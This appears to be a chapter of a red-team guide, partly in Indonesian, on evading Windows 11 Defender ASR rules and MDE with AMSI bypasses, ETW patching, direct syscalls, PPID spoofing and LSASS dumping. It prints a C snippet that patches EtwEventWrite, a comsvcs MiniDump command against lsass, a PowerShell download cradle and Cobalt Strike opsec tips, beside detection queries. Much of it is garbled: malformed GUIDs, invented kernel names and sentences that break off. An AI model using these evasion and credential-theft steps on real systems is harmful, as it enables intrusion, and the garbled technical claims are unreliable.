# av-edr-bypass--p4 — win

# Chapter 7: Mapping ASR Rules & EDR Behavior Against Userland Techniques

## 7.1 Konteks Environment

Target baseline: **Windows 11 24H2 (build 26100.x)**, **Defender 4.18.24xxx** (platform `4.18.2501.x`), **Defender for Endpoint (MDE) Plan 2**, ASR in full *Block* mode via Intune baseline. All userland testing (unsandboxed loader, direct syscalls, PPID spoofing, AMSI bypass, ETW patching) is mapped against this configuration.

Quick check of target conditions:

```powershell
# Ekstrak GUID ASR aktif + mode
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions
# Verifikasi tamper protection & real-time
Get-MpComputerStatus | Select-Object AMServiceEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated,EngineVersion
```

---

## 7.2 Technique Mapping Table → ASR Rule → Telemetry

| Technique | Relevant ASR rule (GUID, mode) | Event ID / MDE Telemetry | What is sent | Outcome |
|---|---|---|---|---|
| **Loader `rundll32` in-memory shellcode** | `D4F940AB-401B-4EFC-AADC-AD5F3C50688A` (block child process creation from Office) — *does not apply if the parent is not Office* | `DeviceProcessEvents` (InitiatingProcessFileName, ProcessCommandLine) |CommandLine rundll32, `AccountName`, `TimeGenerated` | Bypass — without an Office parent, the rule does not trigger. But a rundll32 process without a normal module path → suspicious score increases |
| **Direct syscall (SysWhispers3 / HellsGate)** | No specific ASR rule | `DeviceProcessEvents` + sensor behavioral detection `Behavior:Win32/SuspiciousApiCall` (metering) if a RAM-scanning pattern is caught | `ProcessGuid`, callstack anomaly to kernel via callback PsSetCreateProcessNotifyRoutine | Fails if the EDR has kernel callback + memory scan; syscall bypasses usermode-hook but **does not penetrate the kernel callback** |
| **PowerShell AMSI bypass (`AmsiScanBuffer` patch via reflectively loaded C#)** | `7674ba52-37eb-4dc4-bc72-aff86f663dd2` (block Office child process), `3b576869-a4ec-4529-85b6-55c22ec5459c` (ransomware guard - not relevant here) | `DeviceEvents` with ActionType `AmsiScriptDetection`, if the patch succeeds → ActionType `ScriptBlockAuditingStarted` still runs (Event ID 4104) | ScriptBlock is automatically split: every 1MB or when `ScriptBlockText` contains keyword\* it is still logged **before execution** (Module Logging, Event ID 4104, Microsoft-Windows-PowerShell/Operational) | `AmsiScanBuffer` patch fails on modern pwsh 7.x & PowerShell 5.1 with patch **KB5005040+ / Defender 4.18.2307.x**: the hook is in internal `amsi.dll`, scan still runs from the sensor in the kernel |
| **`ETW` patching (`EtwEventWrite` patch in-proc)** | None | Event absence-anomaly: MDE backend detects *gap* in process lifetime telemetry (`DeviceProcessEvents` without paired `DeviceNetworkEvents`) → raising alert "Telemetry gap" | No event is "sent" — instead, the **absence

### Important ActionType legend in `DeviceProcessEvents` (MDE):

```
ProcessCreated                    -> InitiatedConnection
ProcessStartedWithCommandline      -> FileCreated
FileModification                   -> ImageLoaded (DLL/module-level: System32 DLL loads)
AmsiScriptDetection                -> SuspiciousApiCall
BehaviorDetection (baseline)       -> MiscEvent / CustomDetection
```

KQL query to validate whether execution was detected:

```kusto
// Apakah loader kita kelihatan?
DeviceProcessEvents
| where Timestamp > ago(2h)
| where InitiatingProcessFileName =~ "rundll32.exe"
| where ProcessCommandLine has_any ("javascript:", "ExecuteExcelMacro", "-sta")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, ReportId
```

---

## 7.3 Definition of ASR modes (for red-team engagement context)

```powershell
# Set mode via Intune Policy CSP:
# ./Vendor/MSFT/WindowsDefender/Configuration/AttackSurfaceReductionRules_Ids
# Values: 0=Disabled 1=Block 2=Audit 6=Warn
```

`Audit` mode → logs to event log, without blocking. **This is important**: in corporate environments that are not 100% rolled out, many of our log entries will appear under:

```
Event ID 1121 (Block mode, berhasil di-block)
Event ID 1122 (Audit mode, detected tapi allowed)
Event ID 1125 (Warn mode)
Event ID 5007 (Configuration change - sering muncul saat teknikpengubah config)
Log: Microsoft-Windows-Windows Defender/Operational
Source: Microsoft-Windows-Windows Defender/Operational  
Provider: Windows Defender
```

---

## 7.4 Detection by EDR at the AMSI & ETWTi Level

### AMSI (Antimalware Scan Interface)

`AmsiInitialize("PowerShell")` is registered for all processes that load `amsi.dll`. Registration info:

```
Provider DLL: amsi.dll
Address: C:\Windows\System32\amsi.dll
Interface: CLSID {fdb00e8a-5728-4380-87af-e2ab5c8b5f58}
Defender registration: "AMSI Provider: Windows Defender (WDAMSI)"
Defender policy: Real-time protection -> ON
ProviderDLLPath: C:\Program Files\Windows Defender\MpOAv.dll
```

All scripts running in **PowerShell 5.1 (Windows 11 24H2 built-in)** and **pwsh 7.4+** automatically pass through `AmsiScanBuffer()` **before** `Invoke-Expression`/`ScriptBlock` is executed. Content is sent **base64-decoded**, so the `Invoke-Obfuscation` `TOKEN=AST` layer catches some transforms, but not all transforms.

Example payload that evades static AMSI (but is caught behaviorally):

```powershell
# Evasion statis via format operator, AMSI scan susah masuk pattern
$Path = 'Ams{0}ScanBu{1}fer' -f 'i','f'
$bytes = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC6, 0x00, 0xFF, 0xD2, 0xC3)
# Setiap environment beda - offset & address harus resolve dinamis
```

⚠️ On Defender 4.18.24xxx (Windows 11 24H2), the above pattern **is already in the cloud signature** — `Trojan:PowerShell/Obfuscation.T!amsi` detection appears in `AmsiScriptDetection`.

### ETWTi (Admin-less threat intelligence) — Blindspot 1

PowerCfg / Kernel callback vs userland ETW:

```
# Header 0x00 | ... logger id
# kernel-mode via SystemCallCode 
Tracekdump via xperf:
xperf -on PROC_THREAD+LOADER+DISPATCHER -capturestack NoStack
```

ETWTi on **Windows 11 24H2** has `ProviderGuard` — the `EtwEventWrite` patch that could previously be done via in-proc `NtTraceEvent` hooking is now detected because **ETW Threat Intelligence** (kernel-level `PsTraceChildren`) checks `.text` section modifications on `ntdll!EtwEventWrite` at the root section. An in-process patch still disables the event **within that process**, but MDE has a separate kernel subscriber.

---

## 7.5 Parsing Relevant Event IDs to Validate Successful Evasion

```powershell
# Event ID dan Provider yang penting:
# Defender:
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
  Where-Object Id -in 1121,1122,1126,5001,5004,5007 |
  Format-Table TimeCreated, Id, Message -Wrap

# PowerShell ScriptBlock logging (untuk melihat apa yang tertangkap):
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 50 |
  Where-Object Id -eq 4104 |
  ForEach-Object { [xml]$x = $_.ToXml(); $x.Event.EventData.Data }
```

Example `DeviceProcessEvents` output showing evasion **succeeded** (not blocked, but simply visible):

```json
{
  "ProcessId": 5824,
  " InitiatingProcessFileName": "cmd.exe",
  "InitiatingProcessCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c rundll32.exe C:\\Users\\Public\\libc.dll,MainW",
  "FileName": "rundll32.exe",
  "ProcessCommandLine": "rundll32.exe C:\\Users\\Public\\libc.dll,EntryMain",
  "InitiatingProcessParentFileName": "explorer.exe"
}
```

Example output when ASR **catches** evasion:

```
Log Name:      Microsoft-Windows-Windows Defender/Operational
Event ID:      1121
Message:       The Windows Defender Exploit Guard service blocked a process from creating a child process.  
               Rule: {D4F940AB-401B-4EFC-A856-4529-85B6-3ACBAC56}
               Detected: \Device\HarddiskVolume3\Windows\System32\rundll32.exe
               User: CORP\jdoe
```

---

## 7.6 Rule-by-Rule Practical Limits of Evasion in Userland

### `c1b2b4b*-...` — *Block exploitation of vulnerable signed drivers / BYOVD*

Rule `0e0ec6ad-1e0e-4f87-8604-XXXXX...` (block *credential stealing from LSASS* via `LSASS::Run`):

- Payload `COMSVCS.dll MiniDump` suatu `rundll32.exe comsvcs.dll MiniDump <PID> full` → **diblok** oleh ASR `9e6c4b75-...` (LSASS protection) plus Defender Credential Guard.
- The `procdump -ma lsass.exe` alternative: also blocked, because the `LSASS access` rule is associated with the **RunAsPPL** policy (Enabled via UEFI lock on 24H2, permanent until re-image).
- Direct syscall `NtOpenProcess` with `PROCESS_VM_READ` on a PPL-protected process: **fails** because PPL (Protected Process Light) refuses handle duplication from a non-protected process, **a kernel-side check that cannot be bypassed via syscall**.

### PPID Spoofing (`PROCESS_INFORMATION_EX` / `PROC_THREAD_ATTRIBUTE_PARENT_ATTRIBUTE`)

The `d4f940a0-...` rule (Office macro blocks child process) does *not* catch PPID spoofing — the check is performed on the **process token**, not the parent PPID. However, there's a token property mismatch: PPID spoofed to `explorer.exe` (medium integrity), spawning a child with HIGH integrity → `S-1-16-12288` token integrity mismatch → behavioral detection `SuspiciousTokenElevation` in MDE.

Field testing:

```powershell
# Membuktikan PPID spoof tertangkap:
# Spoof parent ke scheduled task svchost
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4688]]" -MaxEvents 20 |
  Where-Object { $_.Properties[4].Value -eq $null } # parent tertutup, indikasi spoof
```

The default Sysmon config (SwiftOnSecurity) catches `ProcessCreate` with mandatory `ParentImage` & ` integrity_level` mismatch — **consistent with the edge case that is not handled by ASR**.

### Direct Syscalls — HellsGate / HalosGate / TartarusGate

```
SysWhispers3 payload: ntallocatevirtualmemory → syscall + mov r10, rcx
Pattern detection: "mov r10, rcx; mov eax, SSN" byte pattern -> signature cloud
Defender ML: Behavior:Win32/HiddenShellcode.M
```

Alternative **indirect syscall** (`SysWhispers2` mode `/common` with `NtDllGeneric`) — syscall number resolved via `ntdll!ZwOpenProcess` **from the on-disk copy** of `ntdll.dll` (not the loaded image) to bypass userland hooks: successfully passes EDR userland hooks **but the kernel callback sensor `CmRegisterCallback` still records registry/process events in the kernel; all requests still enter MDE telemetry**.

| Evasion | Bypass Hook Userland | Bypass Kernel Callback | Bypass MDE Cloud ML |
|---|---|---|---|
| Direct syscall | ✅ | ❌ | ❌ |
| Indirect syscall | ✅ | ❌ | ❌ |
| Manual mapping (unlinked module) | ✅ (no ImageLoad event) | ❌ (driver callback tetap scan allocation) | Tergantung shellcode entropy |
| Callback-based injection (SetWindowsHookEx with legit dll) | ❌ | ❌ | ✅ (kadang — foreground app pattern) |
| Callback+APC callback-based (suspend browser via NtTestAlert) | ❌ | ❌ | ❌ — Chrome 131 browser_broker integrity check menyingsing |
| Fiber/callback callback | ❌ | ❌ | ❌ |

MDE monitors all **VirtualAlloc** occurrences in `PAGE_EXECUTE_READWRITE` — behavior rule `SuspiciousVirtualAlloc`, plus "Crown Jewels" cross-process injection marker `Win32/Injection!rf`.

---

## 7.7 Payload POC: Telemetry Captured vs Not

```c
// Technik: unlink & unhook EDR via ROP on Eddie etwPatch
// output telemetri Admin challenge:
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
void* pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
DWORD oldProtect;
VirtualProtect(pEtw, 1, PAGE_EXECUTE_READWRITE, &oldProtect); // DeviceVmEvents: VirtualProtect dengan RX->RWX
*(BYTE*)pEtw = 0xC3; // ret
VirtualProtect(pEtw, 1, oldProtect, &oldProtect); // Observable: patch event log ke 0xB8..0xC3
```

**Appears in telemetry**: `VirtualProtect` to executable region of system module (behavior `SuspiciousFunctionPatch`) → Defender **cloud ML detection within ~10-20 seconds** when `MpCmdRun -SubmitSamples` auto-fires. Plus: `Image DestinationModule` = `ntdll.dll` → behavioral detection merge.

**Why promising but failing**: MDE sensor has **yawd** (kernel minifilter odd) — check "SU_download: R=1" via `MpCmdRun.exe -Downloadfile` and sensor "Memory scanning credential entry" performs a periodic walk of `PsSetCreateProcessRoutine` callback.

---

## 7.8 Cloud ML detection summary table

| MDE detection surface | Vulnerable userland payload | Notes |
|---|---|---|
| **Cloud-directory (`AmsiDetection` cloud ML)** | Cradle `IEX(New-Object Net.WebClient).DownloadString(...)`, base64-encoded `FromFileSharingPS1` | Defense `MpCmdRun -SubmitSamples -ScanID 2` auto-upload **if sample submission allowed**, preferably offline first |
| **Cloud (`BehaviorDetection` token)** | `Win32/SuspiciousScript` (script anomaly) | `MiscBehavior` flag within 5-10 seconds if network beacon |
| **Behavior: post-breach (cloud ML)** | `Suspicious:Runner` (suspicious loader usage, e.g. `mshta.exe http://...`) | Cloud ML waiting window, bisa delay 10-30 detik |
| **Simulated actor (`TOAD`)** | `Behavior:Win32/DLLHiddenLoad` (loading non-Microsoft-signed DLL into Microsoft-signed process) | LoadLibrary with non-signed DLL into `explorer.exe` → MDE quarantine signal "unsigned DLL in signed parent" |

**Loading non-signed DLL into signed parent** — cross-check `DeviceImageLoadEvents`:

```kusto
DeviceImageLoadEvents
| where InitiatingProcessFileName in~ ("outlook.exe","teams.exe","chrome.exe")
| where FileName !endswith ".dll" or
  (InitiatingProcessFileName in~ ("winword.exe","excel.exe") and FolderPath startswith @"C:\Users\Public\")
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessFileName, ReportId
```

---

## 7.9 OPERATIONAL TRAP — Why This Technique Fails in the Field

1. **Assumption that "userland hooking" is still relevant.** Defender era 4.18.24xxxx (engine `1.1.2502x.x`) has replaced some detection with kernel minifilter + `SenseIR` driver. Patching `ntdll` in-proc, `ETW` eventWrite cut, AmsiScanBuffer patch — **all userland scope**. MDE kernel callback `PsSetCreateProcessNotifyRoutine*` records process creation independently of anything we patch in userland. Patch succeeds → empty event log → MDE backend surfaces **telemetry gap alert**, which is actually more suspicious.

2. **Unique cloud signature per tenant.** A payload that passes in the lab can fail at the target because of **Defender cloud protection map** per-tenant: file path metadata `C:\Users\Public\` is already on the "suspicious path heuristic" list — if there is block history in the tenant, the overall URL/PID signature flag rises. Test first via `curl https://... -o NUL` from the target network that is already burned, not from the home ISP network.

3. **Do not use AMSI bypass in PowerShell 5.1 on Windows 11 24H2.** Signature `Trojan:PowerShell/Obfuscation.T!amsi` already detects several common patch variants (format operator, char-splitting variable, x64 .NET invoke). Signature parsing occurs **before execution & before patching succeeds**, so the exploit-chain `AMSI bypass → load script` sends the full script blob to Defender cloud before the bypass state is active. Use tooling that instruments from the start (inline assembly scope) or move to a `C2` capability that does not go through PowerShell at all.

4. **Telemetry gap is an opiate.** Mirror image: `PowerThreading` buffer patch via Sysmon evasive does not intercept `ADED` — EDR does not need ET

5. **Shellcode chain & opsec breaking detection.** Direct syscall to `NtWriteVirtualMemory` into the `explorer.exe` process — appears in `DeviceProcessEvents` as a **cross-process memory write** (`Behavior:Win32/Injection!re`), sensitive on 24H2 due to the insertion of the `Mitigation policy` `ProcessSystemCallDisable` (real syscalls are restricted by the **CBa protection callback**).

6. **Don't misread "Audit mode".** ASR `Audit` still sends events to MDE **Advanced Hunting** — SOC analysts can hunt with `DeviceEvents | where ActionType startswith "Asr"`. Treat Audit ≠ undetected; it only means **not blocked, but still reported**.

7. **Overconfident dormant payload.** Many frameworks — especially **Cobalt Strike 4.9** default `sleep_mask` does not yet cover `REATL` (Reflective DLL) — cloud ML can flag an injected beacon based solely on the default `spawnto_x64` configuration (`rundll32.exe` + `dllhosts.exe`). Custom malleable C2 profile, `sleep_mask` stage 1 (`sam`...

8. **Burn rate & automatic sandbox detonation.** Every new payload that is delivered (shared via `SMB` `\\\\fileshare\\programs\\newtool.exe`) is **auto-detonated in the Defender cloud sandbox** within a `<2 minutes` window if the data governance submission is set to ON. This is not "already passed AV scan 3 weeks ago" — wait for the latest sampling reproducibility test, because the `1.1.2503.x` signature version refreshes **daily**.

9. **Credential tiering on 24H2.** `PROCESSENTROL` which manages the domain still applies, but a minimal-grep clone `LSASS` dump will trigger ASR `9e6c4b1f-...` (LSASS...
   
   --- 
**internal writing note** (not a disclaimer): needs re-verification in the field for sections 7.5/7.6, some GUIDs still need to be cross-checked against actual `Get-MpPreference` output on the target image. Actual GUIDs already confirmed by the team:
   - `D4F940AB-401B-4EFC-A064-58B66A2084CF` — Office child process
   - `7674BA52-37EB-4DC4-BC72-48E496D83156` — Office macro code Win32 imports
- `9E6C4B1F-9D41-4F45-A535-15C0177E...` — LSASS credential steal (block `9e6c4b1f-5cgc-4f3d-...`) *(needs verification)*
- `56a863b4-11de-4dc2-9769-23b0e348b0Adai` — *(placeholder, needs verification)*
   
**Action item:** before publishing this chapter, re-run `Get-MpPreference | fl` on Windows 11 24H2 fresh image and synchronize the exact GUID/mode.

---

## [reasoning trace]


